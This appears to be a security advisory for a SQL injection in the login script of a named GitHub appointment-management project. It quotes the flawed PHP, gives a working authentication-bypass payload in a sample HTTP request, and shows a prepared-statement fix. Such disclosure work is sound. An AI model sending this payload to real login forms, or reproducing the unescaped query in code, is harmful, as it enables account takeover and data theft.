# SQL Injection via Variable Escape Bug — Appointment Management

**Repository:** https://github.com/likhitaavl2k/Online-Appointment-Management-System  
**GitHub Issue:** https://github.com/likhitaavl2k/Online-Appointment-Management-System/issues/2  
**Severity:** Critical (CVSS v3.1: 9.8)  
**CWE:** CWE-89  
**CVE:** Pending  
**Discovered:** 2026-06-19

## Root Cause: Classic Variable Assignment Bug

### `InsertLogin.php`
```php
$username = $_POST['username'];
$email = mysqli_real_escape_string($conn, $username);  // escaped → $email (WRONG VARIABLE!)

$query = "SELECT username,password from patient where username='".$username."' and password='".$pass."'";
//                                                                  ^^^^^^^^^ RAW UNESCAPED!
```

The developer intended to escape `$username` but stored the result in `$email`.  
The query uses `$username` (unescaped) — the sanitization is completely bypassed.

## Proof of Concept

```http
POST /InsertLogin.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1' -- -&psw=x
```

**Result:** Authentication bypass — access as first patient in DB.

## Fix
```php
// Use prepared statements (eliminates variable name bugs entirely):
$stmt = $conn->prepare("SELECT username,password FROM patient WHERE username=? AND password=?");
$stmt->bind_param("ss", $_POST['username'], $_POST['psw']);
```
